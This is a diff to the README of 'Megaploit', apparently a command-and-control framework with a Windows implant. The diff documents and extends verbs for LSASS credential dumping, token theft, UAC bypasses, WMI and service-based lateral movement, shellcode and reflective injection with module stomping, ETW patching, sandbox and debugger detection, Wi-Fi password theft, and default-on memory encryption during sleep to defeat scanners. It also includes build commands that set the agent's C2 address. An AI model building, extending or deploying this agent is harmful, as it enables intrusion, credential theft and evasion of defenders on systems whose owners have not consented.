@@ -42,6 +42,10 @@ echo -n "<64-hex-chars>" > secret.key
 cp secret.key C-remote-shell/secret.key
 ```
 
+> **`secret.key` must never be committed.** It is in `.gitignore` and every
+> deployment must generate a fresh key. Using a shared or repository-sourced
+> key allows anyone with a copy of the repo to authenticate a connection.
+
 > **Both copies must be identical.** The server (`server.py`) reads from the
 > repo root. A manual `make` build reads `C-remote-shell/secret.key`. If they
 > differ, the HMAC challenge/response fails and the server closes the socket
@@ -163,24 +167,28 @@ Run `megaploit_c_agent.exe` on the target. The agent:
 
 | Verb | Args | Description |
 |---|---|---|
-| `dump_lsass` | — | `NtCreateSection`/`NtMapViewOfSection` snapshot → `MiniDumpWriteDump` → `%TEMP%\lsass.dmp` |
+| `dump_lsass` | — | `NtCreateSection(SEC_IMAGE_NO_EXECUTE)` snapshot → `MiniDumpWriteDump` → `%TEMP%\lsass.dmp` |
 | `token_impersonate` | `<pid>` | Steal + impersonate the primary token from a process |
 | `token_revert` | — | `RevertToSelf()` — drop back to the process token |
-| `getsystem` | — | Named-pipe token impersonation → SYSTEM token |
+| `getsystem` | — | Named-pipe token impersonation → SYSTEM token (randomised service name) |
 | `uac_bypass` | `[cmd]` | `schtasks /RL HIGHEST` self-relaunch at High IL — no UAC prompt |
 | `uac_reg_hijack` | `<payload>` | HKCU `ms-settings`/`mscfile` registry hijack (fodhelper/eventvwr) |
 | `uac_dll_hijack` | `<dll> <exe>` | DLL search-order plant via `schtasks` CWD trick |
 | `uac_com_hijack` | `<payload>` | `ICMLuaUtil::ShellExec` COM elevation moniker |
 | `uac_env_expand` | `[payload]` | `%APPDATA%` redirect → `srrstr.dll` sideload |
-| `lateral_wmi` | `<host> <cmd>` | Remote exec via `wmic Win32_Process.Create` |
-| `lateral_sc` | `<host> <cmd>` | Remote exec via `sc create/start/delete` (runs as SYSTEM) |
+| `lateral_wmi` | `<host> <cmd>` | Remote exec via WMI `Win32_Process.Create` — PEB-walk COM, no `LoadLibraryA` |
+| `lateral_sc` | `<host> <cmd>` | Remote exec via SCM API (`OpenSCManagerA`/`CreateServiceA`) — no `cmd.exe` |
 
 ### Injection & migration
 
 | Verb | Args | Description |
 |---|---|---|
 | `inject` | `<pid> <hex>` | Inject raw shellcode (hex string) into a process via NT syscalls |
+| `inject_shellcode` | `<pid> <hex>` | Alias for `inject` |
 | `migrate` | `<pid>` | Reflective PE injection into `<pid>`, then `ExitProcess(0)` |
+| `dll_inject` | `<pid>` | Alias for `migrate` |
+| `exec_bof` | `<hex> [args]` | In-process shellcode with BOF-style argument packing (W^X, threadpool) |
+| `stage_load` | — | Receive a PE from C2 and load it reflectively in-process |
 
 ### Background jobs
 
@@ -188,16 +196,19 @@ Run `megaploit_c_agent.exe` on the target. The agent:
 |---|---|---|
 | `bg` | `<cmd>` | Run a shell command in the background — returns a job ID immediately |
 | `jobs` | — | List all background jobs (ID, state, bytes buffered) |
-| `job_output` | `<id>` | Fetch and print the output of a completed job |
-| `job_kill` | `<id>` | Terminate a running background job |
+| `job_output` | `<id>` | Fetch and print the output of a completed job, then free the slot |
+| `job_kill` | `<id>` | Terminate a running background job safely (waits for worker to stop before freeing slot) |
 
-Background jobs are dispatched via the Windows thread pool (`ntdll!TppWorkerThread` call-stack) so worker threads do not originate from a private RX address. Up to 16 concurrent jobs are supported; each job buffers up to 4 MB of output.
+Background jobs are dispatched via the Windows thread pool (`ntdll!TppWorkerThread` call-stack)
+so worker threads do not originate from a private RX address. Up to 16 concurrent jobs are
+supported; each job buffers up to 4 MB of output.
 
 ### In-process evasion
 
 | Verb | Description |
 |---|---|
 | `etw_patch` | Patch `EtwEventWrite` → `ret` in the current process |
+| `sandbox_check` | Report CPU count, disk size, uptime, debugger presence, and VM artefacts |
 
 ### Power / destructive
 
@@ -223,7 +234,12 @@ Background jobs are dispatched via the Windows thread pool (`ntdll!TppWorkerThre
 | `rm <path>` | `del /f /q` or `rmdir /s /q` |
 | `find_files <path> [pat]` | `dir /s /b "<path>\<pat>"` |
 | `file_hash <path>` | `certutil -hashfile "<path>" SHA256` |
-| `<anything else>` | Passed verbatim to `_popen("cmd /c ...")` |
+| `tail <file> [n]` | `powershell Get-Content -Tail <n>` (default 20 lines) |
+| `write_file <path> <content>` | `powershell Set-Content` |
+| `chmod <mode> <path>` | `icacls "<path>"` (Windows approximation) |
+| `find_writable <path>` | `icacls /t` filtered to writable ACEs |
+| `find_suid` | `sc query` + `reg query ImagePath` for non-system-path services |
+| `<anything else>` | Passed verbatim to `cmd /c ...` |
 
 ---
 
@@ -248,6 +264,14 @@ AV heuristic engines that flag manifest-less executables.
 | Kernel image name (`NtSetInformationProcess` class 49 + 74) | Process Hacker "Image" column shows `svchost.exe` |
 | LDR unlink (`PEB→Ldr` list + `LdrpHashTable` bucket) | Hides the module from in-process module scanners; version-aware: skips `InInitializationOrderLinks` on Windows 8+ |
 
+`PEB->ImageBaseAddress` is intentionally **not** overwritten — overwriting it to a
+non-PE pointer would break `GetModuleHandleA(NULL)` and corrupt any in-process PE walking
+(including reflective injection). All process-inspection tools that matter read
+`ProcessParameters->ImagePathName` for the displayed name, not `ImageBaseAddress`.
+
+The spoof strings (`svchost.exe` path and command line) are stored as XOR-encoded byte
+arrays in `.data` — no wide-string literal appears in `.rdata` for FLOSS/strings/YARA to match.
+
 ### 3. EDR evasion (`client/evasion/evasion_obf.c`)
 
 | Function | What it does |
@@ -267,7 +291,7 @@ Ten independent checks run before the C2 connect loop:
 | 3 | Physical RAM < 2 GB | `GlobalMemoryStatusEx` |
 | 4 | Single logical CPU | `GetNativeSystemInfo` — only fires combined with check 1 |
 | 5 | Known sandbox DLLs | PEB LDR walk; hashes of `SbieDll`, `cuckoomon`, `cmdvrt64`, Frida, VMware tools, VirtualBox guest additions, and more |
-| 6 | Suspicious username / hostname | `GetUserNameA` / `GetComputerNameA`; matches 14 user names and 15 host names common in sandbox environments |
+| 6 | Suspicious username / hostname | `GetUserNameA` / `GetComputerNameA`; matches 14 user names and 15 host names common in sandbox environments — all strings SLIT-decoded at runtime, none in `.rdata` |
 | 7 | System drive < 60 GB | `GetDiskFreeSpaceExA("C:\\")` |
 | 8 | Machine uptime < 3 minutes | `GetTickCount64()` |
 | 9 | Debugger attached | `IsDebuggerPresent()` + `PEB.NtGlobalFlag == 0x70` + `NtQueryInformationProcess(ProcessDebugPort)` |
@@ -311,17 +335,19 @@ runtime — no plaintext strings appear in `.rdata`.
 
 ### 7. Sleep obfuscation — Ekko-variant (`client/evasion/sleep_obf.c`)
 
-When `SLEEP_OBF_ENABLE` is defined, `sleep_obf_delay()` RC4-encrypts the agent's own
-`.text` and `.data` sections before each sleep interval and decrypts them on wake:
+**Enabled by default.** Disable with `SLEEP_OBF=0` at build time.
 
-- Key = SHA-256(`RDTSC_seed || module_base || image_size`) truncated to 16 bytes — key changes every execution
+When active, `sleep_obf_delay()` ChaCha20-encrypts the agent's own `.text` and `.data`
+sections before each sleep interval and decrypts them on wake:
+
+- Key derived from `RDTSC_seed || module_base || image_size` — changes every execution
 - Encryption writes through `SC_NtWriteVirtualMemory` on the current process handle, bypassing page-protection checks without flipping pages to RW (which would fire `KERNEL_THREATINT_TASK_PROTECT`)
-- The `sleep_obf_delay()` function itself lives in a separate `.slpobf` section that is excluded from the XOR pass
+- The `sleep_obf_delay()` function itself lives in a separate `.slpobf` section that is excluded from the encryption pass
 - Memory scanner during sleep interval sees only ciphertext — no YARA hits on string patterns or code signatures
 
-Enable at build time:
+Opt out at build time:
 ```bash
-mingw32-make C2_IP=10.0.0.1 SECRET_KEY=... CFLAGS_EXTRA="-DSLEEP_OBF_ENABLE"
+mingw32-make C2_IP=10.0.0.1 SECRET_KEY=... SLEEP_OBF=0
 ```
 
 ### 8. Auto-migration (`client/inject/inject.c`)
@@ -330,11 +356,11 @@ On startup, before the connect loop:
 
 **Tier 1 — Reflective in-memory injection (no disk artifact):**
 1. Finds a live 64-bit `svchost.exe` that can be opened with injection rights
-2. Injects itself via the reflective PE loader blob (`client/inject/loader.c`)
+2. Maps self via the reflective PE loader blob (`client/inject/loader.c`) using module-stomping into one of a randomised pool of candidate system DLLs (`xpsprint.dll`, `msls31.dll`, `tsprint.dll`, `npsm.dll`)
 3. Calls `AgentRun()` in the host process via the Windows thread pool, then `ExitProcess(0)`
 
 **Tier 2 — `%TEMP%` copy fallback (if Tier 1 fails):**
-1. Copies itself to `%TEMP%\RuntimeBroker.exe`
+1. Copies itself to `%TEMP%\RuntimeBroker.exe` (or the name set by `MIGRATE_NAME=`)
 2. Spawns it as `CREATE_SUSPENDED`, resumes, then `ExitProcess(0)`
 
 ### 9. Injection hardening
@@ -450,9 +476,10 @@ nmake C2_IP=10.0.0.1 C2_PORT=4444 SECRET_KEY=<64-hex>
 | `C2_CERT_PIN=` | Optional: 64-hex SHA-256 fingerprint — pin server certificate |
 | `MUTEX_NAME=` | Override single-instance mutex name (default mimics a Windows WIL mutex) |
 | `MIGRATE_NAME=` | Override auto-migrate destination filename (default: `RuntimeBroker.exe`) |
-| `SC_SVC_NAME=` | Override the transient service name used by `lateral_sc` (default: `WinRpcHelper`) |
+| `SC_SVC_NAME=` | Override the transient service name base used by `lateral_sc` |
+| `SLEEP_OBF=0` | Disable sleep obfuscation (enabled by default in all builds) |
 | `DBG=1` | Debug build — see [Debug Builds](#debug-builds) |
-| `CFLAGS_EXTRA=` | Pass arbitrary extra compiler flags (e.g. `-DSLEEP_OBF_ENABLE`, `-DC2_HTTP_PROFILE ...`) |
+| `CFLAGS_EXTRA=` | Pass arbitrary extra compiler flags |
 | `-DALLOW_KEY_ON_DISK` | Enable file-based `secret.key` loading (development builds only) |
 | `-DDISABLE_AUTO_MIGRATE` | Skip migration (only valid via `DBG=1` — blocked in release builds) |
 | `-DDISABLE_EVASION` | Skip `unhook_ntdll`, `etw_patch`, `amsi_patch` (debug only) |
@@ -562,7 +589,7 @@ C-remote-shell/
 │   │
 │   ├── core/                       Entry point and shared NT infrastructure
 │   │   ├── config.h                C2 IP/port, key mode, buffer sizes, obfuscated defaults
-│   │   ├── main.c                  WinMain + AgentRun + _agent_thread + DllMain
+│   │   ├── main.c                  WinMain + _agent_reconnect_loop + AgentRun + _agent_thread + DllMain
 │   │   └── ntcalls.c / ntcalls.h   NT function pointer load/verify with bitmask return codes
 │   │
 │   ├── debug/                      Runtime debugger (compiled only with DBG=1)
@@ -579,13 +606,16 @@ C-remote-shell/
 │   │   ├── syscall.h / syscall.c       Hell's/Halo's/Tartarus' Gate direct syscall stubs
 │   │   ├── syscall_obf.c               Obfuscated build (compiled into binary)
 │   │   ├── sandbox.h / sandbox.c       10-check sandbox/VM/debugger detection + startup delay
-│   │   ├── sleep_obf.h / sleep_obf.c   Ekko-variant sleep obfuscation (RC4 in-memory encryption)
+│   │   ├── sleep_obf.h / sleep_obf.c   ChaCha20 sleep obfuscation (enabled by default)
+│   │   ├── nt_offsets.h                Single source of truth for PEB/LDR/SPI field offsets
 │   │   ├── obf.h                       OBF_S / OBF_W stack-decode macros
 │   │   └── gen_obf.py                  Regenerates *_obf.c from source files
 │   │
 │   ├── inject/                     Process injection, reflective PE loading, auto-migration
 │   │   ├── inject.h / inject.c     inject_shellcode, migrate_to_pid, auto_migrate,
 │   │   │                           sleep_obf_delay, jitter_sleep, sc_threadpool_exec
+│   │   │                           Module-stomping pool: xpsprint.dll, msls31.dll,
+│   │   │                           tsprint.dll, npsm.dll (randomised per invocation)
 │   │   ├── loader.h / loader.c     Position-independent reflective PE loader (< 512 B blob)
 │   │   ├── loader_blob.h           Auto-generated: loader stub as a C byte array (committed)
 │   │   ├── agent.rc                VERSIONINFO + RT_MANIFEST resource script
@@ -594,21 +624,21 @@ C-remote-shell/
 │   │
 │   └── shell/                      Command dispatch and all C2 verb handlers
 │       ├── shell.h                 Public API: shell_run(TLS_CONTEXT *)
-│       ├── shell.c                 Dispatch loop, background job table, _json_unwrap,
-│       │                           _send_str, _shell_exec
+│       ├── shell.c                 O(1) dispatch table (_dispatch_verb), background job table,
+│       │                           _json_unwrap, _send_str, _shell_exec
 │       ├── shell_internal.h        Shared internal API (handler forward declarations)
 │       ├── handlers_system.c       sysinfo, os_info, cd, ls, ps, kill, env,
 │       │                           idle_time, lock_screen, active_windows,
-│       │                           netstat, arp, ifconfig, routes
+│       │                           netstat, arp, ifconfig, routes, wifi_passwords
 │       ├── handlers_system_obf.c   Obfuscated build of handlers_system.c
 │       ├── handlers_ui.c           getclip, setclip, msgbox, upload, download,
 │       │                           persist, self_destruct, run_psh, open_url,
-│       │                           set_wallpaper, mouse_move, type_keys, clip_watch,
-│       │                           wifi_passwords
+│       │                           set_wallpaper, mouse_move, type_keys, clip_watch
 │       ├── handlers_lateral.c      dump_lsass, token_impersonate, token_revert,
 │       │                           getsystem, uac_bypass, uac_reg_hijack,
 │       │                           uac_dll_hijack, uac_com_hijack, uac_env_expand,
-│       │                           lateral_wmi, lateral_sc
+│       │                           lateral_wmi (PEB-walk COM), lateral_sc (SCM API),
+│       │                           exec_bof
 │       └── handlers_lateral_obf.c  Obfuscated build of handlers_lateral.c
 │
 ├── tls/
@@ -623,6 +653,7 @@ C-remote-shell/
 ├── tools/
 │   ├── gen_key.py                  Generate a random 32-byte key + obfuscated make invocation
 │   ├── gen_c2_obf.py               XOR-obfuscate C2_IP/C2_PORT → compiler -D flags
+│   ├── gen_spoof_obf.py            XOR-obfuscate SPOOF_IMAGE/SPOOF_CMDLINE → compiler -D flags
 │   └── gen_loader_blob.py          Compile loader.c → extract blob → write loader_blob.h
 │
 ├── Source.c                        Legacy monolithic client (kept for `make legacy`)
@@ -726,17 +757,23 @@ void _handle_myverb(TLS_CONTEXT *pTls, const char *args)
 void _handle_myverb(TLS_CONTEXT *pTls, const char *args);
 ```
 
-4. **Add a dispatch branch in `client/shell/shell.c`** inside `shell_run()`:
+4. **Add an entry to the dispatch table in `client/shell/shell.c`:**
+
+   a. Add a wrapper near the other `_w_*` helpers:
 
 ```c
-if (cbCmd >= 8 && strncmp("myverb ", cmd, 7) == 0) {
-    char args[256] = {0};
-    strncpy(args, cmd + 7, sizeof(args) - 1);
-    free(pCmd); pCmd = NULL;
-    _handle_myverb(pTls, args);
-    continue;
-}
+static void _w_myverb(TLS_CONTEXT *t, const char *a) { _handle_myverb(t, a); }
 ```
+
+   b. Add a row to `_dispatch[]`:
+
+```c
+{ "myverb ",  7,  1,  _w_myverb },   /* need_arg=1 if it takes an argument */
+```
+
+   For verbs with an optional argument (like `ls` or `env`) that cannot be
+   expressed in the dispatch table, add an explicit `if` block in the
+   `shell_run()` fallback section instead.
 
 5. **If the new handler is in `handlers_system.c` or `handlers_lateral.c`,
    regenerate the obfuscated sources:**
@@ -752,5 +789,5 @@ mingw32-make C2_IP=127.0.0.1 C2_PORT=4444 DBG=1
 ```
 
 No other files need to change. The Megaploit C2 probe (`megaploit/core/c_probe.py`)
-discovers new verbs automatically by scanning the `strncmp()` calls in the compiled
+discovers new verbs automatically by scanning the dispatch table in the compiled
 binary at runtime.
